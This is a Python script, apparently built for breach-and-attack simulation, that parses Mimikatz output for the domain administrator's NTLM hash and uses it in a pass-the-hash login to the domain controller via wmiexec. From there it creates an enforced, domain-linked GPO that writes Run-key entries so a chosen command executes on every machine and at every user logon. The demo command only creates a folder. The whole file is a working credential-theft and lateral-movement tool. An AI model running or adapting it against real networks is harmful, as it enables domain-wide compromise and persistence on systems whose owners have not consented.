import re
import os
import subprocess, socket,time


def check_port(ip, port, timeout=3):
    """檢查目標 IP 的連接埠是否開放"""
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False
    


def get_admin_credentials(filename):
    if not os.path.exists(filename):
        return "ERROR_FILE_NOT_FOUND" 
    
    try:
        # 使用 utf-8 並配合 errors='replace' 防止因特殊字元崩潰
        with open(filename, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read().replace('\x08', '')
        
        # 檢查 Mimikatz 常見權限報錯
        error_keywords = ["kuhl_m_sekurlsa_acquireLSA", "0xc0000022", "ERROR kuhl_m"]
        if any(err in content for err in error_keywords):
            return "ERROR_MIMIKATZ_INCOMPLETE_DUMP"
    except Exception as e:
        return f"ERROR_READ_FAILED: {e}"
    

    sessions = content.split('Authentication Id')
    for session in sessions:
        user_match = re.search(r'User Name\s+:\s+(.+)', session)
        domain_match = re.search(r'Domain\s+:\s+(.+)', session)
        sid_match = re.search(r'SID\s+:\s+S-1-5-21-.*-(\d+)', session)
        ntlm_match = re.search(r'\*\s+NTLM\s+:\s+([a-fA-F0-9]{32})', session)
        server_match = re.search(r'Logon Server\s+:\s+(.+)', session)
        fqdn_match = re.search(r'kerberos :.*?Domain\s+:\s+([^\s]+)', session, re.DOTALL | re.IGNORECASE)

        if user_match and sid_match and ntlm_match:
            # 僅鎖定 RID 500 (內建管理員)
            if sid_match.group(1) == "500":
                user = user_match.group(1).strip()
                domain = domain_match.group(1).strip()
                # 排除某些 Mimikatz 會抓到的空字串或本地帳號
                if user.endswith('$') or domain.lower() == 'window manager':
                    continue
                fqdn = fqdn_match.group(1).strip() if fqdn_match else domain
                dc_ip = server_match.group(1).strip() if server_match else None
                
                # 過濾 "null" 或無效的 Logon Server
                if dc_ip and ("null" in dc_ip.lower() or dc_ip == "."):
                    dc_ip = None

                return {
                    "USER": user,
                    "DOMAIN": domain,
                    "HASH": ntlm_match.group(1).strip(),
                    "DC_IP": dc_ip,
                    "FQDN": fqdn
                }
    return "ERROR_NO_ADMIN_HASH_FOUND"

# --- 2. GPO 派送模組 (使用 wmiexec + PtH) ---
def deploy_gpo_pth(creds, gpo_name, cmd_to_run):
    wmiexec_bin = ".\\wmiexec.exe"
    
    # 1. 檢查 wmiexec 是否存在
    if not os.path.exists(wmiexec_bin):
        print(f"[!] Critical Error: '{wmiexec_bin}' not found in current directory.")
        return

    # 2. 確定目標 IP
    target_dc = creds.get('DC_IP')
    if not target_dc:
        print("Error: No DC IP found. Attempting to use FQDN as target...")
        target_dc = creds['FQDN']

    # 3. 網路連線預檢 (SMB Port 445)
    if not check_port(target_dc, 445):
        print(f"Error: Cannot reach {target_dc} on port 445. Is the DC alive or firewalled?")
        return
    
    print(f"[*] Starting lateral movement to {target_dc} using {creds['USER']} hash ......")

    ps_payload = (
        f"powershell -ExecutionPolicy Bypass -Command \""
        f"$d=(Get-ADDomain).DistinguishedName; "
        f"$n='{gpo_name}'; "
        f"if(!(Get-GPO $n -EA 0)){{New-GPO $n}}; "
        f"New-GPLink -Name $n -Target $d -Enforced Yes -EA 0; "
        f"Set-GPPermissions -Name $n -TargetName 'Authenticated Users' -TargetType Group -PermissionLevel GpoApply -Replace; "
        f"Set-GPRegistryValue -Name $n -Key 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ValueName 'GlobalTask' -Type String -Value '{cmd_to_run}'; "
        f"Set-GPRegistryValue -Name $n -Key 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ValueName 'UserTask' -Type String -Value '{cmd_to_run}'; "
        f"gpupdate /force\""
    )

    # 組合 wmiexec 指令
    target_str = f"{creds['DOMAIN']}/{creds['USER']}@{target_dc}"
    full_cmd = [wmiexec_bin, "-hashes", f":{creds['HASH']}", target_str, ps_payload]

    try:
        result = subprocess.run(full_cmd, capture_output=True, text=True, check=False)
        if result.returncode == 0 or "Process-Id" in result.stdout:
            print("GPO Global Deployment Triggered!")
            print(f"All Users and Computers in {creds['FQDN']}")
            print("Note: Commands will execute after clients run 'gpupdate /force' and perform the NEXT REBOOT or USER LOGON.")   
        elif "Access denied" in result.stdout or "STATUS_ACCESS_DENIED" in result.stdout:
            print("[-] Failed: Access Denied. The hash might be invalid or account lacks permissions.")
        elif "PS_ERROR" in result.stdout:
            print(f"[-] PowerShell execution failed on DC: {result.stdout.strip()}")
        else:
            print("[-] Unknown Deployment State. Output:")
            print(result.stdout if result.stdout else "No stdout")
            print(result.stderr if result.stderr else "No stderr")       
              
    except subprocess.TimeoutExpired:
        print("Error: wmiexec timed out after 60 seconds.")
    except Exception as e:
        print(f"Critical Script Error: {e}")


# --- 3. 主程式流程 ---
def main():
    creds = get_admin_credentials('mimikatz.txt')
    if isinstance(creds, str):
        print(f"Aborted: {creds}")
        return

    print(f"[*] Target Domain: {creds['FQDN']}")    
    print(f"[*] Authenticated as: {creds['DOMAIN']}\\{creds['USER']}")
    print(f"NTLM Hash: {creds['HASH']}")

    gpo_name = "LKC_BAS_43115"
    target_cmd = "cmd.exe /c mkdir C:\\LKC_GPO_FILE" # 全體機器會執行的指令

    deploy_gpo_pth(creds, gpo_name, target_cmd)

if __name__ == "__main__":
    main()